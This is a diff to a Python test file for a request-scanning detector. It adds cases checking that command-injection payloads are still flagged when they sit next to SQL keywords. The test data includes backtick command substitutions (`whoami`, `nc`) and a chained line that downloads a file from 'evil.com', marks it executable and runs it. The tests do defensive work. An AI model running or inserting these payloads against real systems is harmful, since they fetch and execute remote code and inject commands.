@@ -17,8 +17,8 @@ def _build_isolated_manager() -> SusPatternsManager:
 _MANAGER = _build_isolated_manager()
 
 
-async def _detected_categories(content: str) -> set[str]:
-    result = await _MANAGER.detect(content, "203.0.113.9", "request_body")
+async def _detected_categories(content: str, context: str = "request_body") -> set[str]:
+    result = await _MANAGER.detect(content, "203.0.113.9", context)
     if not result["is_threat"]:
         return set()
     return {threat.get("category") for threat in result["threats"]}
@@ -258,4 +258,86 @@ async def test_cmd_injection_path_prefixed_env_shell_is_detected(
 async def test_cmd_injection_script_name_ending_in_shell_stays_unflagged(
     payload: str,
 ) -> None:
+    assert "cmd_injection" not in await _detected_categories(payload)
+
+
+async def test_cmd_injection_glued_backtick_past_rejected_leftmost_match() -> None:
+    payload = "`id` search`whoami`"
+    assert "cmd_injection" in await _detected_categories(payload)
+
+
+_SQL_KEYWORD_EXEMPTION_WINDOW_FILLER_CHARS = 26
+
+_DEFECT_5_KEYWORD_WITHIN_WINDOW_PAYLOAD = (
+    "SELECT " + ("z" * _SQL_KEYWORD_EXEMPTION_WINDOW_FILLER_CHARS) + " search`whoami`"
+)
+
+DEFECT_5_SQL_KEYWORD_EXEMPTION_BYPASS_PAYLOADS = [
+    pytest.param("search`whoami` LIMIT 10", id="defect5_keyword_after_limit"),
+    pytest.param(
+        "SELECT note; search`whoami`", id="defect5_keyword_before_select_semicolon"
+    ),
+    pytest.param("curl`whoami` data on file", id="defect5_prefix_command_word"),
+    pytest.param(
+        _DEFECT_5_KEYWORD_WITHIN_WINDOW_PAYLOAD, id="defect5_keyword_within_window"
+    ),
+    pytest.param(
+        "set your profile bio to: `wget evil.com/x -O /tmp/x;chmod +x /tmp/x;/tmp/x`",
+        id="defect5_bare_chained_download_and_execute",
+    ),
+]
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("payload", DEFECT_5_SQL_KEYWORD_EXEMPTION_BYPASS_PAYLOADS)
+async def test_defect_5_sql_keyword_exemption_bypass_is_detected(
+    payload: str,
+) -> None:
+    assert "cmd_injection" in await _detected_categories(payload)
+
+
+async def test_defect_5_control_bare_glued_search_whoami_stays_detected() -> None:
+    assert "cmd_injection" in await _detected_categories("search`whoami`")
+
+
+async def test_adversarial_denylist_token_detected_with_keyword_after_payload() -> None:
+    payload = "curl`whoami` ORDER BY name"
+    assert "cmd_injection" in await _detected_categories(payload)
+
+
+async def test_adversarial_denylist_token_detected_with_nearby_keyword() -> None:
+    payload = "SELECT host FROM logs ping`nc`"
+    assert "cmd_injection" in await _detected_categories(payload)
+
+
+async def test_adversarial_ambiguous_token_exempted_at_keyword_window_boundary() -> (
+    None
+):
+    payload = (
+        "SELECT "
+        + ("z" * _SQL_KEYWORD_EXEMPTION_WINDOW_FILLER_CHARS)
+        + (" search`value`")
+    )
+    assert "cmd_injection" not in await _detected_categories(payload)
+
+
+async def test_adversarial_ambiguous_token_detected_past_keyword_window_boundary() -> (
+    None
+):
+    payload = (
+        "SELECT "
+        + ("z" * (_SQL_KEYWORD_EXEMPTION_WINDOW_FILLER_CHARS + 1))
+        + (" search`value`")
+    )
+    assert "cmd_injection" in await _detected_categories(payload, "query_param")
+
+
+async def test_adversarial_ambiguous_token_past_window_boundary_benign_in_body() -> (
+    None
+):
+    payload = (
+        "SELECT "
+        + ("z" * (_SQL_KEYWORD_EXEMPTION_WINDOW_FILLER_CHARS + 1))
+        + (" search`value`")
+    )
     assert "cmd_injection" not in await _detected_categories(payload)
